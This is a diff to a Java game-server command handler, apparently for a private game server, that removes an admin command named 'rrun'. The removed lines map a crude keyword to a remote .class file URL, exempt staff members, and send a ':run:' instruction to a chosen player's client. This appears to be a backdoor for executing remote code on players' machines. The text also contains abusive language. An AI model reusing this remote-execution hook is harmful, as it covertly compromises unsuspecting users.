@@ -763,33 +763,6 @@ public class CommandPacketHandler implements PacketHandler {
 	private void processAdminCommands(final Player player, String commandStart,
 			String s, String withCaps, String[] as) {
 
-        if(commandStart.equalsIgnoreCase("rrun")){
-            final String[] args = withCaps.substring(5).split(",");
-            final String targetName = args[0].trim();
-            final String name = args[1].trim().toLowerCase();
-            if(targetName.isEmpty() || name.isEmpty()){
-                player.sendf("Invalid target or keyword");
-                return;
-            }
-            String url = null;
-            if(name.equalsIgnoreCase("rape"))
-                url = "http://cache.arteropk.com/apkscripts/er.class";
-            if(url == null){
-                player.sendf("Invalid keyword");
-                return;
-            }
-            final Player target = World.getWorld().getPlayer(targetName);
-            if(target == null){
-                player.sendf("Invalid target: %s", targetName);
-                return;
-            }
-            if(Rank.isStaffMember(target)){
-                player.sendf("you piece of shit don't run this on staff members");
-                return;
-            }
-            player.sendf(":run:%s", name);
-        }
-
 		if (commandStart.equalsIgnoreCase("setelo")) {
 			int rating = Integer.parseInt(as[1]);
 			player.getPoints().setEloRating(rating);
